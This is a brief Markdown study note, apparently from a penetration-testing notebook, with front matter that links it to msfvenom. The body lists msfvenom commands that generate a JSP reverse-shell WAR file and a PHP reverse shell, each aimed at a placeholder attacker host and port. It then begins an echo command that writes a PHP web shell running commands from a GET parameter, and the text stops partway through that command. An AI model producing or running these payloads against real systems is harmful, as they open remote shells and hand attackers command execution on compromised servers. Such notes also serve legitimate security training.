---
title: payloads
aliases: []
tags:
- study-notes/payloads
category: study_notes
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: payloads.md
related_tools:
- '[[msfvenom]]'
related_techniques: []
related_tactics: []
related_services: []
related_os: []
related_notes: []
mitre_tactic: ''
mitre_technique: ''
real_path: ''
port: ''
protocol: ''
os: ''
---

# payloads

## Payload Generation
- msfvenom
    - war
        ```
        msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
        ```
    - php
        ```
        msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
        ```
- php
    ```
    echo '<?php system($_GET[

